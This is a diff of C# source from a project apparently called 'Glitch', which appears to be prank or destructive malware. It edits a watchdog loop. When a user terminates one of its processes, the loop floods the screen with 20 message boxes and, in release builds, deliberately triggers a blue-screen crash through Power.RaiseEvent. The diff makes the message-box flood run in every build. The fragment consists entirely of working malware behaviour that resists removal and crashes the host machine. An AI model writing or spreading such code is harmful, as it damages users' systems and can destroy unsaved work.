@@ -3,7 +3,10 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 using CC_Functions.W32;
+using GlitchPayloads;
 
 namespace Glitch
 {
@@ -49,13 +52,17 @@ Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!
             while (true)
                 if (Process.GetProcessesByName(modN).Length != WDC + 1)
                 {
+                    for (int i = 0; i < 20; i++)
+                        Task.Run(() =>
+                        {
+                            MessageBox.Show(KillMessagesArr[Common.Rnd.Next(0, KillMessagesArr.Length)]);
+                        });
+                    Thread.Sleep(4000);
 #if DEBUG
                     Process[] p = Process.GetProcessesByName(modN);
-                    for (int i = 0; i < p.Length; i++) p[i].Kill();
+                    for (int i = 0; i < p.Length; i++)
+                        p[i].Kill();
 #else
-                    for (int i = 0; i < 20; i++)
-                            System.Threading.Tasks.Task.Run(() => { MessageBox.Show(KillMessagesArr[Common.Rnd.Next(0, KillMessagesArr.Length)]); });
-                    Thread.Sleep(4000);
                     Power.RaiseEvent(Power.ShutdownMode.BSoD);
 #endif
                 }
